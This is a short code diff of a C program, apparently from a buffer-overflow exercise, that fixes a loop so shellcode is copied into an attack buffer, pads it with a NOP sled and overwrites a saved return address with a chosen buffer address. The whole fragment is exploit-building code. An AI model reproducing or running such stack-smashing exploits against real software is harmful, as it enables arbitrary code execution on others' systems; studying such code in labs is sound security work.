@@ -19,12 +19,9 @@ main ( int argc, char * argv[] )
 	char attack_buffer[BUF_SIZE];
 
 	for (int i = 0; i < SHELL_SIZE; i++)
-		attack_buffer[0] = shellcode[i];
+		attack_buffer[i] = shellcode[i];
 	for (int i = SHELL_SIZE; i < BUF_SIZE; i++)
 		attack_buffer[i] = 0x90;
-
-	printf("%s", attack_buffer);
-
 
 	int *ret_address = (int*)&attack_buffer[BUF_TO_RET];
 	*ret_address = BUF_ADDR;
